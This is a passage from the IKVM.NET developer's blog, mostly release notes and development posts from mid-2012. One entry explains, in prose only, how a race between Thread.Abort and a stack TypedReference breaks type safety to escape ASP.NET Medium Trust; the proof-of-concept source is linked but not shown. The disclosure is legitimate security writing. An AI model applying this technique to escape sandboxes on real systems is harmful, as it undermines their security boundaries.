		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=eeba74ea-0252-459b-8c67-2178d938ac32"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=eeba74ea-0252-459b-8c67-2178d938ac32">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 16 July 2012</h2></div>
<div class="newsItems"><a name="ac004201f-a226-4a98-8b12-904378e773d5"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.1 Released</h3>
	<div class="entryBody">
		<P>I've released <A href="https://sourceforge.net/projects/ikvm/files/ikvm/7.1.4532.2/">IKVM.NET 7.1</A> to SourceForge. The binaries are identical to the ones in <A HREF="/PermaLink.aspx?guid=60bd175b-1c00-4f4f-99e5-cbe922bd3f79">release candidate 2</A>.</P>
<P><B>Release Notes</B></P>
<P>This document lists the improvements, known issues and incompatibilities.</P>
<P><STRONG>What's New</STRONG> (relative to <A HREF="/PermaLink.aspx?guid=692505a6-f9e7-45ec-90b9-ec7a75d3b509">IKVM.NET 7.0</A>):</P>
<UL>
<LI>Integrated OpenJDK 7 u4 b22. </LI>
<LI>Dropped experimental partial trust support.</LI>
<LI>Much improved ikvmc error and warning handling. </LI>
<LI>Added ikvmc options: -win32manifest, -filealign, -highentropyva.</LI>
<LI>Removed ikvmc -platform:Itanium option.</LI>
<LI>Added ikvm.lang.DllExport annotation to export static methods as unmanaged entry points.</LI>
<LI>Added ikvm.runtime.Util.getClassFromTypeHandle() overload for classes that represent arrays of remapped .NET types and .NET primitives.</LI>
<LI>Added extension methods for (almost) all instance methods in Object, String and Throwable to ikvm.extensions.ExtensionMethods.</LI>
<LI>Added support for delegates with ByRef parameters.</LI>
<LI>Added support to ikvmc to automatically set the full source path in the debugging info if the source file lives next to the .class file.</LI>
<LI>When adding certificates to virtual cacerts file make sure that the aliases that are generated from the certificate subject are unique.</LI>
<LI>Many (minor) bug fixes.</LI>
<LI>Many IKVM.Reflection fixes and improvements.</LI></UL>
<P><B>Runtime</B></P>
<UL>
<LI>Code unloading (aka class GC) is not supported. 
<LI>In Java static initializers can deadlock, on .NET some threads can see uninitialized state in cases where deadlock would occur on the JVM. 
<LI>JNI<BR>&nbsp; 
<UL>
<LI>Only supported in the default AppDomain. 
<LI>Only the JNICALL calling convention is supported! (On Windows, HotSpot appears to also support the cdecl calling convention). 
<LI>Cannot call string contructors on already existing string instances 
<LI>A few limitations in Invocation API support<BR>&nbsp; 
<UL>
<LI>The Invocation API is only supported when running on .NET. 
<LI>JNI_CreateJavaVM: init options "-verbose[:class|:gc|:jni]", "vfprintf", "exit" and "abort" are not implemented. The JDK 1.1 version of JavaVMInitArgs isn't supported. 
<LI>JNI_GetDefaultJavaVMInitArgs not implemented 
<LI>JNI_GetCreatedJavaVMs only returns the JavaVM if the VM was started through JNI or a JNI call that retrieves the JavaVM has already occurred. 
<LI>DestroyJVM is only partially implemented (it waits until there are no more non-daemon Java threads and then returns JNI_ERR). 
<LI>DetachCurrentThread doesn't release monitors held by the thread.</LI></UL>
<LI>Native libraries are never unloaded (because code unloading is not supported).</LI></UL>
<LI>The JVM allows any reference type to be passed where an interface reference is expected (and to store any reference type in an interface reference type field), on IKVM this results in an IncompatibleClassChangeError. 
<LI>monitorenter / monitorexit cannot be used on unitialized this reference. 
<LI>Floating point is not fully spec compliant. 
<LI>A method returning a boolean that returns an integer other than 0 or 1 behaves differently (this also applies to byte/char/short and for method parameters). 
<LI>Synchronized blocks are not async exception safe. 
<LI>Ghost arrays don't throw ArrayStoreException when you store an object that doesn't implement the ghost interface. 
<LI>Class loading is more eager than on the reference VM. 
<LI>Interface implementation methods are never really final (interface can be reimplemented by .NET subclasses). 
<LI>JSR-133 finalization spec change is not fully implemented. The JSR-133 changes dictate that an object should not be finalized unless the Object constructor has run successfully, but this isn't implemented.</LI>
<LI><A href="http://openjdk.java.net/projects/jdk7/features/#fa535991">Strict class-file checking</A> is not implemented.</LI>
<LI>If a class with a finalizer and static initializer allocates instances of itself in the static initializer and the static initializer subsequently fails, the .NET runtime may abort the application when trying to finalize the objects.</LI></UL>
<P><B>Static Compiler (ikvmc)</B></P>
<UL>
<LI>Some subtle differences with ikvmc compiled code for public members inherited from non-public base classes (so called "access stubs"). Because the access stub lives in a derived class, when accessing a member in a base class, the derived cctor will be run whereas java (and ikvm) only runs the base cctor. 
<LI>Try blocks around base class ctor invocation result in unverifiable code (no known compilers produce this type of code). 
<LI>Try/catch blocks before base class ctor invocation result in unverifiable code (this actually happens with the Eclipse compiler when you pass a class literal to the base class ctor and compile with -target 1.4). 
<LI>Only code compiled together during a single compilation fully obeys the JLS binary compatibility rules. </LI></UL>
<P><B>Class Library</B></P>
<P>Most class library code is based on OpenJDK 7u4 build 22. Below is a list of divergences and IKVM.NET specific implementation notes.</P>
<TABLE cellSpacing=0>
<TBODY>
<TR>
<TD style="BORDER-TOP: black 1px solid">com.sun.security.auth.module&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD style="BORDER-TOP: black 1px solid">Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.applet</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.awt</TD>
<TD>Partial System.Windows.Forms based back-end. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.io.Console</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>java.lang.instrument</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.lang.management</TD>
<TD>Limited implementation.</TD></TR>
<TR>
<TD>java.net</TD>
<TD><A href="http://openjdk.java.net/projects/jdk7/features/#f405">SCTP</A> and <A href="http://openjdk.java.net/projects/jdk7/features/#f639">SDP</A> not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.net.ProxySelector</TD>
<TD>Getting the default system proxy for a URL is not implemented.</TD></TR>
<TR>
<TD>java.nio.file</TD>
<TD>Most optional features (e.g. ACLs) are not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>java.text.Bidi</TD>
<TD>Not supported.</TD></TR>
<TR>
<TD>java.util.zip</TD>
<TD>Partially based on GNU Classpath implementation.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.crypto</TD>
<TD><A href="http://openjdk.java.net/projects/jdk7/features/#f73">ECC</A> is not implemented.</TD></TR>
<TR>
<TD>javax.imageio.plugins.jpeg</TD>
<TD>Partial implementation. JPEGs can be read and written and there is limited metadata support.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.management</TD>
<TD>Limited implementation.</TD></TR>
<TR>
<TD>javax.print</TD>
<TD>There is a Win32 specific printing implementation. Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.script</TD>
<TD>ECMAScript implementation is not included.</TD></TR>
<TR>
<TD>javax.smartcardio</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.sound</TD>
<TD>Not implemented.</TD></TR>
<TR>
<TD>javax.swing</TD>
<TD>Not supported.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>javax.tools</TD>
<TD>Not supported.</TD></TR>
<TR>
<TD>org.ietfs.jgss</TD>
<TD>Not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD>sun.jdbc.odbc</TD>
<TD>Implementation based on .NET ODBC managed provider.</TD></TR>
<TR>
<TD>sun.net.www.content.audio</TD>
<TD>Audio content handlers not implemented.</TD></TR>
<TR bgColor=#f0f0f0>
<TD style="BORDER-BOTTOM: black 1px solid">sun.net.www.content.image</TD>
<TD style="BORDER-BOTTOM: black 1px solid">Not supported.</TD></TR></TBODY></TABLE>
<P>The entire public API is available, so "Not implemented." for javax.smartcardio, for example, means that the API is there but there is no back-end to provide the actual smartcard communication support. "Not supported." means that the code is there and probably works at least somewhat, but that I'm less likely to fix bugs reported in these areas, but patches are welcome, of course.</P>
<P>Specific API notes:</P>
<UL>
<LI>java.lang.Thread.stop(Throwable t) doesn't support throwing arbitrary exceptions on other threads (only java.lang.ThreadDeath). 
<LI>java.lang.Thread.holdsLock(Object o) causes a spurious notify on the object (this is allowed by the J2SE 5.0 spec). 
<LI>java.lang.String.intern() strings are never garbage collected. 
<LI>Weak/soft references and reference queues are inefficient and do not fully implement the required semantics. 
<LI>java.lang.ref.SoftReference: Soft references are not guaranteed to be cleared before an OutOfMemoryError is thrown. 
<LI>Threads started outside of Java aren't "visible" (e.g. in ThreadGroup.enumerate()) until they first call Thread.currentThread(). 
<LI>java.lang.Thread.getState() returns WAITING or TIMED_WAITING instead of BLOCKING when we're inside Object.wait() and blocking to re-acquire the monitor. 
<LI>java.nio.channel.FileChannel.lock() shared locks are only supported on Windows NT derived operating systems. 
<LI>java.lang.SecurityManager: Deprecated methods not implemented: classDepth(String), inClass(String), classLoaderDepth(), currentLoadedClass(), currentClassLoader(), inClassLoader()</LI>
<LI>java.util.zip.ZipFile(String, CharSet) constructor added in Java 7 is missing.</LI>
<LI>The class org.omg.PortableInterceptor.UNKNOWN is included, but is not part of Java 7.</LI></UL>
<P><B>Supported Platforms</B></P>
<P>This release has been tested on the following CLI implementations / platforms:</P>
<TABLE border=0>
<TBODY>
<TR>
<TD><B>CLI Implementation&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Architecture&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </B></TD>
<TD><B>Operating System</B></TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x86</TD>
<TD>Windows 7</TD></TR>
<TR>
<TD>.NET 2.0 SP2</TD>
<TD>x64</TD>
<TD>Windows 7</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x86</TD>
<TD>Windows 7</TD></TR>
<TR>
<TD>.NET 4.0</TD>
<TD>x64</TD>
<TD>Windows 7</TD></TR>
<TR>
<TD>Mono 2.10.5</TD>
<TD>x86</TD>
<TD>Windows 7</TD></TR>
<TR>
<TD>Mono 2.10.5</TD>
<TD>x64</TD>
<TD>Ubuntu 11.10</TD></TR></TBODY></TABLE>
<P><BR><B>Partial Trust</B></P>
<P>Experimental support for running in partial trust has been withdrawn. Due to the deprecated nature of <A href="http://support.microsoft.com/kb/2698981">ASP.NET partial trust</A> and the fact that supporting partial trust in .NET 4.0 will be impossible to combine with serialization interop, I've decided to stop supporting partial trust scenarios.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/16/2012 08:40:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c004201f-a226-4a98-8b12-904378e773d5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c004201f-a226-4a98-8b12-904378e773d5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 29 June 2012</h2></div>
<div class="newsItems"><a name="a60bd175b-1c00-4f4f-99e5-cbe922bd3f79"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.1 Release Candidate 2</h3>
	<div class="entryBody">
		<P>I found and fixed a code generation bug, so a new release candidate. The bug has been around since the very early days, but a change in 2010 made it more likely to surface. It showed up while debugging the Derby problem reported by Dash in the comments <A href="/CommentView.aspx?guid=C129DD0D-BFEC-4465-9574-5275AB785238">here</A>.</P>
<P>Changes (relative to rc 1):</P>
<UL>
<LI>Updated version to 7.1.4532.2 
<LI>Fixed a code analysis bug that under specific circumstances caused incorrect local variable types or null reference loads from local variables.</LI></UL>
<P>When the final release is done, it will include the full release notes.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4532.2.zip">ikvmbin-7.1.4532.2.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.1.4532.2.zip">ikvmsrc-7.1.4532.2.zip</A>, <A href="http://www.frijters.net/openjdk-7u4-stripped.zip">openjdk-7u4-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/29/2012 11:21:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=60bd175b-1c00-4f4f-99e5-cbe922bd3f79"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=60bd175b-1c00-4f4f-99e5-cbe922bd3f79">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 26 June 2012</h2></div>
<div class="newsItems"><a name="aeeff8042-628a-4a81-ad6d-d32267c5ea0d"></a><div class="entry">
	<h3 class="entryTitle">Experimental WinRT Support in IKVM.Reflection</h3>
	<div class="entryBody">
		<P>I've added support for generating Windows Runtime assemblies with IKVM.Reflection. This is still experimental because it is mostly based on reverse engineering as there currently is virtually no documentation on this.</P>
<P>The code for generating a&nbsp;trivial component is available <A href="http://www.frijters.net/winrt.cs.txt">here</A>. It doesn't require .NET 4.5 or any Windows Runtime metadata assemblies.</P>
<P>The IKVM.Reflection code is available in cvs.</P>
<P>BTW, I did this mostly because I was curious about what's involved. Don't read anything into this wrt IKVM.NET itself. It's unlikely to ever support running in WinRT.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/26/2012 18:05:11 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=eeff8042-628a-4a81-ad6d-d32267c5ea0d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=eeff8042-628a-4a81-ad6d-d32267c5ea0d">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 25 June 2012</h2></div>
<div class="newsItems"><a name="a509710e7-e9ce-4cf4-b7ed-130409a63161"></a><div class="entry">
	<h3 class="entryTitle">Why ASP.NET Medium Trust Isn't</h3>
	<div class="entryBody">
		<P>On October 24 of last year I reported an ASP.NET Medium Trust vulnerability. This eventually resulted in <A href="http://support.microsoft.com/kb/2698981">KB 2698981</A> where Microsoft essentially deprecated ASP.NET&nbsp;Partial Trust.</P>
<P>The problem I reported was that it is possible to abuse <CODE><A href="http://msdn.microsoft.com/en-us/library/system.threading.thread.abort.aspx">Thread.Abort()</A></CODE> to create an inconsistent <CODE><A href="http://msdn.microsoft.com/en-us/library/System.TypedReference.aspx">TypedReference</A></CODE> that violates type safety.</P>
<P>TypedReference is an interesting type and I've been on the lookout for a way to abuse it for a long time. It's purpose is to allow type safe references to be used in a generic way. To implement this&nbsp;a TypedReference contains both a pointer and a type and all operations it allows make sure that type safety isn't violated. It's a primitive type, so the runtime knows about it and treats it specially. It can be used from partially trusted code and because it can contain a reference to a location on the stack, the runtime enforces that TypedReference values can only be used from a single thread (by disallowing boxing&nbsp;or storing it in arrays or fields).</P>
<P>However, by having one thread repeatedly overwriting a TypedReference location on the stack with two different values and&nbsp;a second&nbsp;thread aborting the first thread at the right moment, you can end up with a TypedReference that combines&nbsp;the pointer from one value and the type from another value and thus violating type safety.</P>
<P>The source of the PoC is available <A href="http://www.frijters.net/kb2698981.aspx.txt">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/25/2012 10:26:33 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=509710e7-e9ce-4cf4-b7ed-130409a63161"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=509710e7-e9ce-4cf4-b7ed-130409a63161">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 20 June 2012</h2></div>
<div class="newsItems"><a name="a10e37c9a-593f-4ff1-bb2c-6f8a152cd8ac"></a><div class="entry">
	<h3 class="entryTitle">MS12-038 and IKDASM</h3>
	<div class="entryBody">
		<P>Past patch Tuesday Microsoft released MS12-038 that updated System.Windows.Forms.dll. It fixes a vulnerability in clipboard handling.</P>
<P>To compare the unpatched and patched versions of the assembly, I added an option to ikdasm to supress some of the irrelevant differences. For example, it replaces all uses of the '&lt;PrivateImplementationDetails&gt;{nnnnnnnn-nnnn-nnnn-nnnn-nnnnnnnnnnnn}' class (that the C# compiler generates) where nnnnnnnn-nnnn-nnnn-nnnn-nnnnnnnnnnnn is the module version GUID with the literal string (i.e. it replaces the GUID digits with n-characters). Another change is that some metadata items are sorted by name. Specifically, property and event accessors and custom attributes tend to be ordered differently between different builds.</P>
<P>It's likely that I'll add more in the future.</P>
<P>The option is named -diffmode. Usage is straight forward:</P>
<P><CODE>&nbsp;&nbsp;&nbsp; ikdasm -diffmode -out:System.Windows.Forms.il System.Windows.Forms.dll</CODE></P>
<P>Updated ikdasm sources are available here: <A href="http://www.frijters.net/ikdasm-v0.2.zip">ikdasm-v0.2.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/20/2012 15:07:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=10e37c9a-593f-4ff1-bb2c-6f8a152cd8ac"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=10e37c9a-593f-4ff1-bb2c-6f8a152cd8ac">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 19 June 2012</h2></div>
<div class="newsItems"><a name="a641ce989-450a-4db6-94c2-1dbb9597053a"></a><div class="entry">
	<h3 class="entryTitle">Ten Years of IKVM.NET</h3>
	<div class="entryBody">
		<P><A href="http://onjava.com/pub/a/onjava/2004/08/18/ikvm.html"><IMG border=0 hspace=15 align=left src="http://www.frijters.net/111-ikvm.gif"></A>Ten years ago today I <A HREF="/PermaLink.aspx?guid=1">started blogging</A> about IKVM.NET. It's been an amazing journey and when I started it I never would have guessed I'd still be on it ten years later.</P>
<P>Some of the highlights include making many new friends, meeting industry luminaries, speaking at conferences, working with the GNU Classpath community (and the fun FOSDEM weekends), working with the Mono community and, of course, the open sourcing of OpenJDK.</P>
<P>The end of the journey is not yet in sight as I still have enormous amounts of fun and both Java and .NET keep adding new features that keep things interesting.</P>
<P>Some statistics:</P>
<UL>
<LI>540 blog entries 
<LI>739 blog comments 
<LI>22 releases 
<LI>Over 200000 downloads 
<LI>3637 messages to the ikvm-developers mailing list 
<LI>4577 messages to the ikvm-commit mailing list 
<LI>10 security vulnerabilities reported 
<LI>9 CLR JIT bugs encountered. 
<LI>2 name changes (from I&lt;&lt;K.VM.NET to IK.VM.NET to IKVM.NET)</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2012 08:49:34 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=641ce989-450a-4db6-94c2-1dbb9597053a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=641ce989-450a-4db6-94c2-1dbb9597053a">Comments [10]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 13 June 2012</h2></div>
<div class="newsItems"><a name="a1e964ad8-3c99-4241-8e68-b595cc0c73bd"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.1 Release Candidate 1</h3>
	<div class="entryBody">
		<P>The second release candidate is available. Unlike the previous rc, this one is buildable on Linux again (tested with Mono 2.10.5). It also fixes a regression in final field handling.</P>
<P>Changes (relative to rc 0):</P>
<UL>
<LI>Updated version to 7.1.4532.1</LI>
<LI>Fixed Linux build issue due to assembly.class filename case error in tools.rsp</LI>
<LI>Updated copyright years in LICENSE</LI>
<LI>Merged in OpenJDK 7u4 changes in THIRD_PARTY_README.</LI>
<LI>Bug fix. AssemblyClassLoader.InternalsVisibleToImpl() would crash with NRE if it got called on a single assembly class loader, because it should call GetLoader(Assembly) to get the AssemblyLoader instead of GetLoaderForExportedAssembly().</LI>
<LI>Bug fix. When resolving properties corresponding to fields with type 2 access stubs, unloadable types with the same name should compare as equal.</LI>
<LI>Bug fix. When a final field is wrapped in a property, any assemblies that are concurrently compiled with the declaring assembly will access the backing field directly and hence the declaring assembly will need an InternalsVisibleToAttribute to allow them access. This fix makes sure that this attribute is applied when the field is accessed from another (concurrently compiled) assembly.</LI>
<LI>IKVM.Reflection: Added workaround for Mono 2.10 bug in AssemblyName (public key token for ECMA public key is not created correctly).</LI>
<LI>IKVM.Reflection: Added workaround for Mono to StrongNameKeyPair.</LI>
<LI>IKVM.Reflection: Disallow key container constructor of StrongNameKeyPair when running on Mono on Windows.</LI>
<LI>IKVM.Reflection: Bug fix. Type.GetInterfaces() should work for unbaked types.</LI></UL>
<P>When the final release is done, it will include the full release notes.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4532.1.zip">ikvmbin-7.1.4532.1.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.1.4532.1.zip">ikvmsrc-7.1.4532.1.zip</A>, <A href="http://www.frijters.net/openjdk-7u4-stripped.zip">openjdk-7u4-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/13/2012 08:35:13 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1e964ad8-3c99-4241-8e68-b595cc0c73bd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1e964ad8-3c99-4241-8e68-b595cc0c73bd">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 30 May 2012</h2></div>
<div class="newsItems"><a name="ae12d6d5e-418b-4564-99ba-6a08dd493884"></a><div class="entry">
	<h3 class="entryTitle">IKVM.NET 7.1 Release Candidate 0</h3>
	<div class="entryBody">
		<P>The first release candidate is available. No changes (except the version number and strong naming) relative to the last development snapshot.</P>
<P>What's New (relative to <A HREF="/PermaLink.aspx?guid=692505a6-f9e7-45ec-90b9-ec7a75d3b509">IKVM.NET 7.0</A>):</P>
<UL>
<LI>Integrated OpenJDK 7u4 b22.</LI>
<LI>Much improved ikvmc error and warning handling.</LI>
<LI>Added ikvmc options: -win32manifest, -filealign, -highentropyva.</LI>
<LI>Removed ikvmc -platform:Itanium option.</LI>
<LI>Added ikvm.lang.DllExport annotation to export static methods as unmanaged entry points.</LI>
<LI>Added ikvm.runtime.Util.getClassFromTypeHandle() overload for classes that represent arrays of remapped .NET types and .NET primitives.</LI>
<LI>Added extension methods for (almost) all instance methods in Object, String and Throwable to ikvm.extensions.ExtensionMethods.</LI>
<LI>Added support for delegates with ByRef parameters.</LI>
<LI>Added support to ikvmc to automatically set the full source path in the debugging info if the source file lives next to the .class file.</LI>
<LI>When adding certificates to virtual cacerts file make sure that the aliases that are generated from the certificate subject are unique.</LI>
<LI>Many (minor) bug fixes.</LI>
<LI>Many IKVM.Reflection fixes and improvements.</LI></UL>
<P>When the final release is done, it will include the full release notes.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4532.0.zip">ikvmbin-7.1.4532.0.zip</A></P>
<P>Sources: <A href="http://www.frijters.net/ikvmsrc-7.1.4532.0.zip">ikvmsrc-7.1.4532.0.zip</A>, <A href="http://www.frijters.net/openjdk-7u4-stripped.zip">openjdk-7u4-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/30/2012 09:45:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e12d6d5e-418b-4564-99ba-6a08dd493884"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e12d6d5e-418b-4564-99ba-6a08dd493884">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 24 May 2012</h2></div>
<div class="newsItems"><a name="a4575490f-828c-4b2d-b38d-0dc2be3e9b71"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P><A href="http://jdk7.java.net/source.html">OpenJDK 7u4</A> has been integrated. Next stop RC.</P>
<P>Changes:</P>
<UL>
<LI>Integrated <A href="http://www.java.net/download/openjdk/jdk7u4/promoted/b22/openjdk-7u4-fcs-src-b22-02_may_2012.zip">OpenJDK 7u4 b22</A>.</LI>
<LI>Fixed threading bug in sun.font.PhysicalStrike (bug #<A href="https://sourceforge.net/tracker/?func=detail&amp;atid=525264&amp;aid=3524226&amp;group_id=69637">3524226</A>).</LI>
<LI>Fixed regression introduced in 7.0 that caused the manifest to be ignored when creating the java.lang.Package objects.</LI>
<LI>Updated boot class&nbsp;package property that still referred to Sun Microsystems instead of Oracle Corporation.</LI></UL>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-7.1.4527.zip">ikvmbin-7.1.4527.zip</A></P>
<P>OpenJDK 7u4 b22 stripped sources: <A href="http://www.frijters.net/openjdk-7u4-stripped.zip">openjdk-7u4-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/24/2012 11:04:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4575490f-828c-4b2d-b38d-0dc2be3e9b71"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4575490f-828c-4b2d-b38d-0dc2be3e9b71">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 11 May 2012</h2></div>
<div class="newsItems"><a name="a977499e8-0a70-4744-9482-5b6132504055"></a><div class="entry">
	<h3 class="entryTitle">Using MethodRental.SwapMethodBody to do Method Level JIT Compilation</h3>
	<div class="entryBody">
		<P>IKVM.NET has always had a class&nbsp;granularity JIT. Whenever a type is first "used" the CLR fires the <A href="http://msdn.microsoft.com/en-us/library/system.appdomain.typeresolve.aspx">AppDomain.TypeResolve</A> event and at that point the IKVM.NET runtime compiles the Java bytecode to CIL for all of the methods in the class.</P>
<P>I don't recall my exact thought process, but I assume that when I started on IKVM.NET I looked at <A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.methodrental.swapmethodbody.aspx">MethodRental.SwapMethodBody</A> and was scared away by the lack of documentation and the fact that it requires full trust and manually constructing a method body blob.</P>
<P>Later on, I focussed more on static compilation and didn't care too deeply about dynamic performance. So I never revisited this decision. However, recently I have been thinking about dynamic performance, triggered by potential invokedynamic optimizations.</P>
<P>To get reacquainted with MethodRental.SwapMethodBody I wrote a small program that dynamically creates the following class:</P>
<TABLE>
<TBODY>
<TR>
<TD width=40></TD>
<TD><PRE>class Frob {<BR>  public Frob(int i) {
    Console.WriteLine(i);
  }
  public static void M(int i) {
    Console.WriteLine();
    Console.WriteLine(new Frob(i));
  }
}</PRE></TD></TR></TBODY></TABLE>
<P>The code is available here: <A href="http://www.frijters.net/MethodRentalDemo.cs">MethodRentalDemo.cs</A></P>
<P>When the constructor and the M method are first created, the method body is defined, using <A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.methodbuilder.createmethodbody.aspx">MethodBuilder.CreateMethodBody</A>, as a simple trampoline that calls Program.JIT to just-in-time generate the actual CIL for the method.</P>
<P>Here's the managed JIT trampoline CIL code for Frob.M:</P>
<TABLE>
<TBODY>
<TR>
<TD width=40></TD>
<TD><PRE>ldtoken    method void Frob::M(int32))
call       void Program::JIT(valuetype System.RuntimeMethodHandle)
jmp        void Frob::M(int32)
